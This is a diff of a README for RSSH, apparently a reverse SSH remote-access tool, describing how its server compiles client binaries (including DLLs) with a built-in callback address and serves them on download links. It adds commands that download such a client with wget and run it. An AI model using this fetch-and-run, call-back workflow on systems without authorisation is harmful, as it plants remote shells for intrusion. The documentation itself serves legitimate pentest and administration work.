@@ -159,23 +159,42 @@ $ bin/client example.com:1234
 
 ### Built in Web Server
 
-The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries that are compiled on the fly, for whatever platform you specify. 
+The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be places in the project `bin/` folder, otherwise it cannot find source for the client.
 
 ```sh
-./server --enable_webserver your.listen.address:port
+# Homeserver_address sets the default baked in call back for the client
+./server --homeserver_address 192.168.122.1:1234 --enable_webserver :1234
 
 # Generate an unnamed link
-ssh your.listen.address -p port link
+ssh 192.168.122.1 -p 1234
 
-http://your.listen.address:port/483f6d194ed62f889c853725b6a29748
+catcher$ link -h
+
+link [OPTIONS]
+Link will compile a client and serve the resulting binary on a link which is returned.
+This requires the web server component has been enabled.
+	-t	Set number of minutes link exists for (default is one time use)
+	-s	Set homeserver address, defaults to server --homeserver_address if set, or server listen address if not.
+	-l	List currently active download links
+	-r	Remove download link
+	--goos	Set the target build operating system (default to runtime GOOS)
+	--goarch	Set the target build architecture (default to runtime GOARCH)
+	--name	Set link name
+	--shared-object	Generate shared object file
+	--cross-compiler	Specify C/C++ cross compiler used for compiling shared objects (currently only DLL, linux -> windows)
+
+# Build a client binary
+catcher$ link --name test
+http://192.168.122.1:1234/test
 
 ```
 
 Then you can download it as follows
 
 ```sh
-wget http://your.listen.address:port/483f6d194ed62f889c853725b6a29748
-chmod +x {filename}
+wget http://192.168.122.1:1234/test
+chmod +x test
+./test
 ```
 
 
